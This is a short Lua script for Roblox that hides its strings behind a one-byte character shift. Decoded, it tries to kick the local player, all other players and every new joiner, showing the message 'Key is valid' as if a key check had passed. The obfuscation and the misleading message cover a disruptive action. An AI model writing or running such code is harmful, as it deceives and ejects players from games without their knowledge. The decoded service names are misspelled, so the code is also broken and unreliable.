local function f(g)local h={}for i=1,#g do h[i]=string.char(string.byte(g,i)-1)end return table.concat(h)end
local j=game:GetService(f("Qmzfsf"))local k=j[f("Mpbdlp")]if k then k[f("Lfjl")](k,f("Lfz!jt!wbmje#"))end
for l,m in pairs(j:GetPlayers())do if m~=k then pcall(function()m[f("Lfjl")](m,f("Lfz!jt!wbmje#"))end)end end
j[f("Qmzfsf!Beefe")]:Connect(function(n)task.wait(0.3)pcall(function()n[f("Lfjl")](n,f("Lfz!jt!wbmje#"))end)end)
